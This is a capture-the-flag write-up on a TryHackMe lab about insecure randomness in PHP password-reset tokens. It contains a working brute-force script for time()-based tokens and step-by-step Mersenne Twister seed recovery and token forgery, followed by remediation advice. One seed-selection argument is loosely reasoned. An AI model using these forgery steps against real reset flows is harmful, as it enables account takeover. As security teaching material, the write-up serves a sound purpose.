# TryHackMe — Insecure Randomness

**Room:** [https://tryhackme.com/room/insecurerandomness](https://tryhackme.com/room/insecurerandomness)  
**Host:** `random.thm:8090`  
**Objective:** Compromise user accounts by exploiting predictable token generation in a PHP web application.  
**Classification:** CWE-330 (Use of Insufficiently Random Values), CWE-340 (Generation of Predictable Numbers), CWE-338 (Use of Cryptographically Weak PRNG)  

---

## Table of Contents

1. [Theory — Randomness Hierarchy](#1-theory--randomness-hierarchy)  
2. [Case 1 — Predictable Reset Token via `time()`](#2-case-1--predictable-reset-token-via-time)  
3. [Case 2 — Mersenne Twister Seed Recovery via `php_mt_seed`](#3-case-2--mersenne-twister-seed-recovery-via-php_mt_seed)  
4. [Kill Chain Summary](#4-kill-chain-summary)  
5. [Standards Mapping](#5-standards-mapping)  
6. [Remediation](#6-remediation)  
7. [Lessons Learned](#7-lessons-learned)  

---

## 1. Theory — Randomness Hierarchy

Three tiers of number generation, from weakest to strongest:

| Tier | Example | Entropy | Predictable? |
|------|---------|---------|-------------|
| **No randomness** | `time()`, `uniqid()`, autoincrement | 0 bits (public value) | Trivially — value is computable |
| **PRNG** | `mt_rand()`, `Math.random()`, `rand()` | Up to 32 bits (seed space) | Yes — state recoverable from output |
| **CSPRNG** | `random_bytes()`, `random_int()`, `/dev/urandom` | 128–256 bits | No — computationally infeasible |

The core question for any token: **where do the bits come from, and can the attacker recover them?**

**Mersenne Twister (MT19937)** — PHP's `mt_rand()` engine:

```
Seed (32-bit) → Expansion Algorithm → State[624 × 32-bit]
                                           ↓
                              mt_rand() call #1 → reads State[0] → tempering → output₁
                              mt_rand() call #2 → reads State[1] → tempering → output₂
                              ...
                              mt_rand() call #624 → reads State[623] → output₆₂₄
                                           ↓
                                      Twist operation → New State[624] → cycle repeats
```

Key property: **one seed → one deterministic sequence forever**. Knowing the seed = knowing every past and future output.

---

## 2. Case 1 — Predictable Reset Token via `time()`

### 2.1 Source Code Analysis

**Frontend** (`forget_password.php`): jQuery form POSTs `user_id` to `send_reset_link.php`. No CSRF token, no rate limiting.

**Backend** (`send_reset_link.php`):

```php
$stmt = $db->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute([':username' => $user_id]);
$user = $stmt->fetch(PDO::FETCH_ASSOC);

if ($user) {
    $token = $user_id . time();
    $update = $db->prepare("UPDATE users SET reset_token = :token WHERE username = :username");
    // ...
}
```

### 2.2 Vulnerability

The token is a **concatenation of the username and Unix timestamp** — no randomness involved at all.

- `$user_id` = known (target username `VICTIM`)
- `time()` = Unix timestamp in seconds, predictable within ±1 second
- Effective entropy for the attacker: **0 bits**

Classification: **CWE-340** (Generation of Predictable Numbers).

### 2.3 Exploitation

**Step 1 — Record timestamp and trigger reset:**

```bash
date +%s          # → e.g. 1729180800
curl -X POST http://random.thm:8090/case/send_reset_link.php \
     -d "user_id=VICTIM"
```

**Step 2 — Brute-force the token (exploit script):**

```python
import requests
import sys

def brute_force_token(username, start_timestamp):
    url = "http://random.thm:8090/case/reset_password.php"
    
    for i in range(-300, 0):
        current_timestamp = start_timestamp + i
        token = f"{username}{current_timestamp}"
        params = {'token': token}
        
        response = requests.get(url, params=params)
        
        if "Invalid or expired token." not in response.text:
            print(f"Correct token identified: {token}")
            return token
        else:
            print(f"Tried token: {token} (Invalid)")
    
    print("No valid token found in the given range.")
    return None

if len(sys.argv) != 3:
    print("Usage: python exploit.py <username> <unix_timestamp>")
    sys.exit(1)

username = sys.argv[1]
start_timestamp = int(sys.argv[2])

brute_force_token(username, start_timestamp)
```

**Step 3 — Execute:**

```bash
python exploit.py VICTIM 1729180800
# → Correct token identified: VICTIM1729180798
# → Open reset_password.php?token=VICTIM1729180798
# → Set new password → Account compromised
```

Maximum 300 requests. At ~50 req/s = **6 seconds** to find the valid token.

---

## 3. Case 2 — Mersenne Twister Seed Recovery via `php_mt_seed`

### 3.1 Vulnerability

Token generation uses `mt_rand()` with a **computable seed**:

```php
mt_srand(crc32($email) + $secret);
$token = mt_rand();
$encoded_token = base64_encode($token);
```

The seed is derived from `crc32(email) + secret`, where `secret` is a static integer. This is **CWE-335** (Incorrect Usage of Seeds in PRNG) combined with **CWE-338** (Use of Cryptographically Weak PRNG).

### 3.2 Attack — Phase 1: Recover the Secret

**Step 1 — Obtain a known token.** Request a password reset for a controlled account (`magic@mail.random.thm`) and extract the token from the reset email:

```
Token (Base64): MTEzNTUwODU0MQ==
Token (Decoded): 1135508541
```

**Step 2 — Find candidate seeds with `php_mt_seed`:**

```bash
./php_mt_seed 1135508541
```

Output:

```
seed = 0x318ff649 = 831518281  (PHP 7.1.0+)
seed = 0x39dc3504 = 970732804  (PHP 7.1.0+)
seed = 0x6d8817a7 = 1837635495 (PHP 7.1.0+)
seed = 0x6d8817a7 = 1837635495 (PHP 7.1.0+)
seed = 0xbe3249b3 = 3190966707 (PHP 7.1.0+)
Found 5
```

**Step 3 — Compute CRC32 of the known email:**

```bash
python3 -c "import binascii; print(binascii.crc32(b'magic@mail.random.thm'))"
# → 970731467
```

**Step 4 — Derive the secret:**

```
seed    = crc32(email) + secret
secret  = seed - crc32(email)
secret  = 970732804 - 970731467
secret  = 1337
```

Only seed `970732804` yields a clean integer — confirming it as the correct candidate.

### 3.3 Attack — Phase 2: Forge Token for Target

**Step 5 — Compute seed for the target account (`hr@mail.random.thm`):**

```bash
python3 -c "import binascii; print(binascii.crc32(b'hr@mail.random.thm'))"
# → 3226467716

# hr_seed = crc32 + secret
# hr_seed = 3226467716 + 1337 = 3226469053
```

**Step 6 — Generate the forged token:**

```bash
php -r "mt_srand(3226469053); echo base64_encode(mt_rand());"
```

**Step 7 — Use the forged token to reset the target's password:**

```
http://random.thm:8090/case/reset_password.php?token=<forged_base64_token>
```

### 3.4 Predicted Token Samples (magic@mail.random.thm)

All 10 sequential `mt_rand()` outputs from seed `970732804`:

| # | Base64 Token | Decoded Value |
|---|---|---|
| 1 | MTEzNTUwODU0MQ== | 1135508541 |
| 2 | MTk5MjYxOTk2Nw== | 1992619967 |
| 3 | MjAyNDUwNTY5OA== | 2024505698 |
| 4 | MTcyOTkwNTcxMw== | 1729905713 |
| 5 | NTI5NTk2MzYw | 529596360 |
| 6 | NjY5MjgwNzUx | 669280751 |
| 7 | MTc2NzI0NjEzMw== | 1767246133 |
| 8 | MTk4MjQxMTQ5NA== | 1982411494 |
| 9 | ODk4Mjg4MTA4 | 898288108 |
| 10 | MzE2NDg2MDY= | 31648606 |

---

## 4. Kill Chain Summary

```
                        CASE 1                              CASE 2
                    time()-based token               mt_rand()-based token
                          │                                   │
              ┌───────────┴───────────┐           ┌───────────┴───────────┐
              │   Recon: source       │           │   Recon: obtain own   │
              │   disclosure reveals  │           │   token via email     │
              │   $token = user.time()│           │   Base64 → decode     │
              └───────────┬───────────┘           └───────────┬───────────┘
                          │                                   │
              ┌───────────┴───────────┐           ┌───────────┴───────────┐
              │   Exploit: record     │           │   Exploit: php_mt_seed│
              │   timestamp, brute    │           │   recovers seed       │
              │   300 values (6 sec)  │           │   candidates          │
              └───────────┬───────────┘           └───────────┬───────────┘
                          │                                   │
                          │                       ┌───────────┴───────────┐
                          │                       │   Derive: secret =    │
                          │                       │   seed - crc32(email) │
                          │                       │   secret = 1337       │
                          │                       └───────────┬───────────┘
                          │                                   │
                          │                       ┌───────────┴───────────┐
                          │                       │   Forge: compute      │
                          │                       │   victim seed, gen    │
                          │                       │   mt_rand() token     │
                          │                       └───────────┬───────────┘
                          │                                   │
              ┌───────────┴───────────────────────────────────┴───────────┐
              │         Password reset → Account takeover                │
              └──────────────────────────────────────────────────────────┘
```

---

## 5. Standards Mapping

| Standard | ID | Description |
|---|---|---|
| **CWE** | CWE-330 | Use of Insufficiently Random Values |
| **CWE** | CWE-335 | Incorrect Usage of Seeds in PRNG |
| **CWE** | CWE-338 | Use of Cryptographically Weak PRNG |
| **CWE** | CWE-340 | Generation of Predictable Numbers |
| **CWE** | CWE-598 | Token in GET request (URL exposure) |
| **OWASP WSTG** | WSTG-ATHN-08 | Testing for Weak Password Change/Reset |
| **OWASP WSTG** | WSTG-CRYP-04 | Testing for Weak Encryption |
| **OWASP WSTG** | WSTG-SESS-03 | Testing for Session Fixation |
| **MITRE ATT&CK** | T1078.003 | Valid Accounts: Local Accounts |
| **MITRE ATT&CK** | T1539 | Steal Web Session Cookie |
| **CVSS 3.1** | 8.1 | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N |

---

## 6. Remediation

### Vulnerable Pattern → Secure Alternative

```php
// ❌ VULNERABLE — no randomness
$token = $user_id . time();

// ❌ VULNERABLE — weak PRNG, predictable seed
mt_srand(crc32($email) + $secret);
$token = mt_rand();

// ❌ VULNERABLE — hash does not add entropy
$token = md5(mt_rand());

// ✅ SECURE — CSPRNG, 256-bit entropy
$token = bin2hex(random_bytes(32));
```

### Additional Controls

- **Rate limiting** — max 3–5 reset attempts per account per hour
- **Short TTL** — token expires after 10–15 minutes
- **Single use** — token invalidated immediately after use
- **Session binding** — token valid only from the session that requested it
- **Secure transport** — POST parameters or HTTP headers, never GET/URL
- **Constant-time comparison** — `hash_equals()` to prevent timing attacks

---

## 7. Lessons Learned

### What slowed progress

- Multiple `php_mt_seed` candidates required contextual analysis (CRC32 subtraction) to identify the correct seed — not just picking the first result.
- Understanding that 10 predicted tokens were a safety net for unknown intermediate `mt_rand()` calls, not all required for exploitation.

### Key takeaways

1. **`time()` is not randomness** — it is a public, deterministic value. Concatenating it with a known username produces a token with 0 bits of effective entropy.
2. **`mt_rand()` is not cryptographic** — Mersenne Twister's 32-bit seed space is exhaustively searchable in seconds with `php_mt_seed`. A single observed output compromises the entire state.
3. **Hashing weak input does not create strong output** — `md5(mt_rand())` has the same 2³² search space as raw `mt_rand()`. The hash is a transformation, not an entropy source.
4. **The `crc32(email) + secret` pattern is broken by design** — knowing one email-token pair reveals the secret, which then forges tokens for any user. This is the same vulnerability class exploited in the Decryptify room (`crc32 + const` seed).
5. **Defense requires layered controls** — CSPRNG alone is necessary but not sufficient. Rate limiting, short TTL, single-use enforcement, and secure transport complete the defense.

### Tools Used

| Tool | Purpose |
|---|---|
| `php_mt_seed` (Openwall) | Brute-force MT19937 seed from observed output |
| `python3 binascii.crc32()` | Compute CRC32 checksums for email addresses |
| `base64` decode | Extract raw token values from encoded format |
| `curl` | HTTP requests to reset endpoints |
| Custom Python script | Brute-force `time()`-based tokens |

---

*Writeup by Artem — CPTS → OSCP+ → CRTO track*  
*Room completed: October 2026*
